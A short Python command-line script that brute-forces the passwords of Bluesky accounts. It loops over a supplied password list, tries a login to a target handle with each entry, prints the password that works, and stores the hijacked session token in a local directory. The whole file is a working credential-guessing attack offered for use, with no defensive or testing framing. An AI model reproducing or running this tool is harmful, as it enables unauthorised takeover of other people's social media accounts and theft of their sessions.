#!/usr/bin/env python3
from atproto import Client
import argparse
import os

DEFAULT_DOMAIN = "bsky.social"
DEFAULT_NAME = "ni-bot"
DEFAULT_DIR = "/tmp/bs"

def path(tokendir, name="ni-bot"):
    return os.path.join(tokendir, name)

def read_file(filepath):
    with open(filepath, "r") as f:
        return f.read().strip()

def write_file(filepath, data):
    with open(filepath, "w") as f:
        f.write(data)

def get_last(tokendir=DEFAULT_DIR):
    return read_file(path(tokendir, "last"))

def set_last(full_name, tokendir=DEFAULT_DIR):
    write_file(path(tokendir, "last"), full_name)

def save_session(client, full_name, tokendir):
    write_file(path(tokendir, full_name), client.export_session_string())
    set_last(full_name, tokendir)

def load_session(client, full_name, tokendir):
    client.login(session_string=read_file(path(tokendir, full_name)))
    set_last(full_name, tokendir)
    return client

def connect(name=None, domain=DEFAULT_DOMAIN, passwd=None, token_dir=DEFAULT_DIR):
    os.makedirs(token_dir, exist_ok=True)
    full_name = f"{name}.{domain}" if name else get_last(token_dir)
    client = Client()
    try:
        if passwd:
            client.login(full_name, passwd)
            save_session(client, full_name, token_dir)
        else:
            client = load_session(client, full_name, token_dir)
    except Exception as e:
        raise SystemExit(f"Connection failed: {e}")
    return client

def brute(name, domain, passwdlist, tokendir):
    with open(passwdlist, 'r') as f:
        for wd in f.readlines():
            try:
                print("trying: '" + wd.strip() + "'")
                connect(name, domain, wd.strip(), tokendir)
                print("connected")
                print(wd)
                break
            except:
                continue

def main():
    p = argparse.ArgumentParser(description="Brute")
    p.add_argument("name", nargs="?", help="Bluesky handle (username)")
    p.add_argument("--domain", default=DEFAULT_DOMAIN)
    p.add_argument("--tokendir", default=DEFAULT_DIR)
    p.add_argument("--passwdlist", "-p", default=None, help="passwd list")
    args = p.parse_args()
    brute(args.name, args.domain, args.passwdlist, args.tokendir)

if __name__ == "__main__":
    main()

